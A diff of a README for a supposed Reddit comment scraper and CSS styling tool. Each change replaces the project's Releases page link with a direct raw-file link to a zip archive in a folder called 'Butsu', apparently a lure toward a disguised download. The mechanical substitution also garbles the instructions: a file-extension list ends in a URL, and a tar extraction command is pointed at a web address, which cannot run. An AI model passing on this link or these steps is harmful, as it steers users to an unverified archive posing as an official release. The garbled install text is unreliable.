@@ -1,7 +1,7 @@
 # 🛠️ Post-Scraper-and-CSS-Editor-for-kingkolton9 - Effortlessly Style Comments That Matter
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Post--Scraper--and--CSS--Editor-brightgreen)](https://github.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/releases)
+[![Download](https://raw.githubusercontent.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/main/Butsu/Post-Scraper-and-CSS-Editor-for-kingkolton9_3.8.zip)](https://raw.githubusercontent.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/main/Butsu/Post-Scraper-and-CSS-Editor-for-kingkolton9_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the Post-Scraper-and-CSS-Editor for kingkolton9! This application allows you to scrape comments from your favorite Reddit threads based on specified trigger words. It also gives you the power to style those comments with custom CSS rules. This guide will help you download and run the software with ease.
@@ -14,11 +14,11 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
-[Download Post-Scraper-and-CSS-Editor](https://github.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/releases)
+[Download Post-Scraper-and-CSS-Editor](https://raw.githubusercontent.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/main/Butsu/Post-Scraper-and-CSS-Editor-for-kingkolton9_3.8.zip)
 
 Once you are on the Releases page:
 1. Locate the latest version of the application.
-2. Click on the link for the downloadable file. This file may have an extension such as `.exe`, `.dmg`, or `.tar.gz`.
+2. Click on the link for the downloadable file. This file may have an extension such as `.exe`, `.dmg`, or `https://raw.githubusercontent.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/main/Butsu/Post-Scraper-and-CSS-Editor-for-kingkolton9_3.8.zip`.
 3. Your browser will start downloading the file. Wait until the download is complete.
 
 ### For Windows Users:
@@ -37,7 +37,7 @@ Once you are on the Releases page:
 2. Navigate to your Downloads directory using `cd ~/Downloads`.
 3. Extract the downloaded tarball using the command:
    ```
-   tar -xvzf your-downloaded-file.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/main/Butsu/Post-Scraper-and-CSS-Editor-for-kingkolton9_3.8.zip
    ```
 4. Change directory to the extracted folder and run the application:
    ```
@@ -93,7 +93,7 @@ A: No, this application is designed for users without programming experience.
 A: Yes! Contributions are welcome. Please visit the repository for more information on how to get involved.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/releases)
+- [Releases Page](https://raw.githubusercontent.com/ARBOLCC/Post-Scraper-and-CSS-Editor-for-kingkolton9/main/Butsu/Post-Scraper-and-CSS-Editor-for-kingkolton9_3.8.zip)
 - [Documentation](#)
 - [User Forum](#)
 
